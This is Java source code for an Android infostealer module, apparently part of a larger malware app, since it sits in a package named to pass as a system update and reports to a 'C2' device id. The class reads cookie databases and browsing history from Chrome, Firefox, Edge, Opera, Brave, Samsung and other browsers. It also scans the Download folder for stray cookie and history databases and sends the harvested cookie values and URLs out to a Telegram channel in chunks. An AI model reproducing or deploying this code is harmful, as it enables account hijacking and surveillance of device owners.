package com.system.update;

import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.os.Environment;

import java.io.BufferedInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.util.ArrayList;
import java.util.List;

/**
 * Browser cookie + history harvest → plain text lists to Telegram.
 * /data/data needs root; still probes + copies to cache then reads.
 */
public final class BrowserSteal {

    private static final String[] PKGS = {
            "com.android.chrome", "com.chrome.beta", "com.chrome.dev",
            "org.mozilla.firefox", "org.mozilla.firefox_beta",
            "com.microsoft.emmx", "com.opera.browser", "com.brave.browser",
            "com.sec.android.app.sbrowser", "com.vivaldi.browser",
            "com.duckduckgo.mobile.android", "com.kiwi.browser"
    };

    private BrowserSteal() {}

    public static void run(Context ctx) {
        new Thread(() -> {
            try {
                File work = new File(ctx.getCacheDir(), "bscan");
                if (!work.exists()) work.mkdirs();

                StringBuilder cookiesTxt = new StringBuilder();
                StringBuilder historyTxt = new StringBuilder();
                int cookieRows = 0, histRows = 0;

                for (String pkg : PKGS) {
                    // Chrome-family paths
                    String[] chromeFiles = {
                            "/data/data/" + pkg + "/app_chrome/Default/Cookies",
                            "/data/data/" + pkg + "/app_chrome/Default/History",
                            "/data/data/" + pkg + "/app_webview/Default/Cookies",
                            "/data/data/" + pkg + "/databases/webviewCookiesChromium.db",
                            "/data/data/" + pkg + "/app_opera/Default/Cookies",
                            "/data/data/" + pkg + "/app_opera/Default/History"
                    };
                    for (String path : chromeFiles) {
                        File src = new File(path);
                        File local = copyIfPossible(src, work);
                        if (local == null) continue;
                        if (path.endsWith("Cookies") || path.contains("Cookie")) {
                            cookieRows += parseChromeCookies(local, cookiesTxt, pkg);
                        } else if (path.endsWith("History")) {
                            histRows += parseChromeHistory(local, historyTxt, pkg);
                        }
                    }
                    // Firefox
                    File ff = new File("/data/data/" + pkg + "/files");
                    scanFirefox(ff, work, cookiesTxt, historyTxt, pkg);
                }

                // external leftovers
                File sd = Environment.getExternalStorageDirectory();
                if (sd != null) {
                    scanLoose(new File(sd, "Download"), work, cookiesTxt, historyTxt);
                }

                if (cookieRows == 0 && histRows == 0) {
                    Telegram.send("🌐 BROWSER\nid=" + C2.getDeviceId()
                            + "\nno readable cookie/history (sandbox or need root for /data/data)");
                } else {
                    flushText(cookiesTxt, "🍪 COOKIES id=" + C2.getDeviceId() + " rows=" + cookieRows);
                    flushText(historyTxt, "📜 HISTORY id=" + C2.getDeviceId() + " rows=" + histRows);
                }
                Telegram.reportEvent(C2.getDeviceId(),
                        "browser_txt cookies=" + cookieRows + " history=" + histRows);
            } catch (Throwable t) {
                Telegram.reportEvent(C2.getDeviceId(), "browser_err:" + t.getMessage());
            }
        }, "browser-steal").start();
    }

    private static void flushText(StringBuilder sb, String header) {
        if (sb.length() == 0) {
            Telegram.send(header + "\n(empty)");
            return;
        }
        Telegram.send(header);
        String all = sb.toString();
        int pos = 0;
        int part = 1;
        while (pos < all.length()) {
            int end = Math.min(pos + 3200, all.length());
            Telegram.send("[" + part + "]\n" + all.substring(pos, end));
            pos = end;
            part++;
            try { Thread.sleep(350); } catch (InterruptedException ignored) {}
            if (part > 25) break;
        }
    }

    private static File copyIfPossible(File src, File work) {
        if (src == null || !src.exists() || !src.canRead()) return null;
        try {
            File dst = new File(work, src.getName() + "_" + Math.abs(src.getAbsolutePath().hashCode()));
            try (FileInputStream in = new FileInputStream(src);
                 FileOutputStream out = new FileOutputStream(dst)) {
                byte[] buf = new byte[8192];
                int r;
                while ((r = in.read(buf)) != -1) out.write(buf, 0, r);
            }
            return dst;
        } catch (Throwable t) {
            // try open directly
            return src.canRead() ? src : null;
        }
    }

    private static int parseChromeCookies(File db, StringBuilder out, String pkg) {
        int n = 0;
        SQLiteDatabase sql = null;
        try {
            sql = SQLiteDatabase.openDatabase(db.getAbsolutePath(), null,
                    SQLiteDatabase.OPEN_READONLY | SQLiteDatabase.NO_LOCALIZED_COLLATORS);
            Cursor c = sql.rawQuery(
                    "SELECT host_key, name, value, path FROM cookies LIMIT 500", null);
            if (c == null) return 0;
            while (c.moveToNext()) {
                String host = c.getString(0);
                String name = c.getString(1);
                String val = c.getString(2);
                String path = c.getString(3);
                out.append(pkg).append(" | ").append(host)
                        .append(" | ").append(name).append("=").append(val)
                        .append(" | ").append(path).append('\n');
                n++;
            }
            c.close();
        } catch (Throwable t) {
            // encrypted value column on modern chrome — still dump host/name
            try {
                if (sql != null) sql.close();
                sql = SQLiteDatabase.openDatabase(db.getAbsolutePath(), null,
                        SQLiteDatabase.OPEN_READONLY | SQLiteDatabase.NO_LOCALIZED_COLLATORS);
                Cursor c = sql.rawQuery(
                        "SELECT host_key, name, length(encrypted_value) FROM cookies LIMIT 500", null);
                if (c != null) {
                    while (c.moveToNext()) {
                        out.append(pkg).append(" | ").append(c.getString(0))
                                .append(" | ").append(c.getString(1))
                                .append(" | enc_len=").append(c.getInt(2)).append('\n');
                        n++;
                    }
                    c.close();
                }
            } catch (Throwable ignored) {}
        } finally {
            try { if (sql != null) sql.close(); } catch (Throwable ignored) {}
        }
        return n;
    }

    private static int parseChromeHistory(File db, StringBuilder out, String pkg) {
        int n = 0;
        SQLiteDatabase sql = null;
        try {
            sql = SQLiteDatabase.openDatabase(db.getAbsolutePath(), null,
                    SQLiteDatabase.OPEN_READONLY | SQLiteDatabase.NO_LOCALIZED_COLLATORS);
            Cursor c = sql.rawQuery(
                    "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 300",
                    null);
            if (c == null) return 0;
            while (c.moveToNext()) {
                out.append(pkg).append(" | ").append(c.getString(0))
                        .append(" | ").append(c.getString(1))
                        .append(" | visits=").append(c.getInt(2)).append('\n');
                n++;
            }
            c.close();
        } catch (Throwable ignored) {
        } finally {
            try { if (sql != null) sql.close(); } catch (Throwable ignored) {}
        }
        return n;
    }

    private static void scanFirefox(File filesDir, File work, StringBuilder cookies,
                                    StringBuilder history, String pkg) {
        if (filesDir == null || !filesDir.exists()) return;
        File[] list = filesDir.listFiles();
        if (list == null) return;
        for (File f : list) {
            if (!f.isDirectory()) continue;
            File c = new File(f, "cookies.sqlite");
            File p = new File(f, "places.sqlite");
            File lc = copyIfPossible(c, work);
            File lp = copyIfPossible(p, work);
            if (lc != null) parseFirefoxCookies(lc, cookies, pkg);
            if (lp != null) parseFirefoxPlaces(lp, history, pkg);
        }
    }

    private static void parseFirefoxCookies(File db, StringBuilder out, String pkg) {
        SQLiteDatabase sql = null;
        try {
            sql = SQLiteDatabase.openDatabase(db.getAbsolutePath(), null,
                    SQLiteDatabase.OPEN_READONLY | SQLiteDatabase.NO_LOCALIZED_COLLATORS);
            Cursor c = sql.rawQuery(
                    "SELECT host, name, value FROM moz_cookies LIMIT 500", null);
            if (c == null) return;
            while (c.moveToNext()) {
                out.append(pkg).append(" | ").append(c.getString(0))
                        .append(" | ").append(c.getString(1)).append("=")
                        .append(c.getString(2)).append('\n');
            }
            c.close();
        } catch (Throwable ignored) {
        } finally {
            try { if (sql != null) sql.close(); } catch (Throwable ignored) {}
        }
    }

    private static void parseFirefoxPlaces(File db, StringBuilder out, String pkg) {
        SQLiteDatabase sql = null;
        try {
            sql = SQLiteDatabase.openDatabase(db.getAbsolutePath(), null,
                    SQLiteDatabase.OPEN_READONLY | SQLiteDatabase.NO_LOCALIZED_COLLATORS);
            Cursor c = sql.rawQuery(
                    "SELECT url, title, visit_count FROM moz_places ORDER BY last_visit_date DESC LIMIT 300",
                    null);
            if (c == null) return;
            while (c.moveToNext()) {
                out.append(pkg).append(" | ").append(c.getString(0))
                        .append(" | ").append(c.getString(1))
                        .append(" | visits=").append(c.getInt(2)).append('\n');
            }
            c.close();
        } catch (Throwable ignored) {
        } finally {
            try { if (sql != null) sql.close(); } catch (Throwable ignored) {}
        }
    }

    private static void scanLoose(File dir, File work, StringBuilder cookies, StringBuilder history) {
        if (dir == null || !dir.exists()) return;
        File[] list = dir.listFiles();
        if (list == null) return;
        for (File f : list) {
            if (!f.isFile()) continue;
            String n = f.getName().toLowerCase();
            if (n.contains("cookie") && (n.endsWith(".db") || n.endsWith(".sqlite"))) {
                File l = copyIfPossible(f, work);
                if (l != null) parseChromeCookies(l, cookies, "loose");
            }
            if (n.contains("history") && (n.endsWith(".db") || n.endsWith(".sqlite"))) {
                File l = copyIfPossible(f, work);
                if (l != null) parseChromeHistory(l, history, "loose");
            }
        }
    }
}
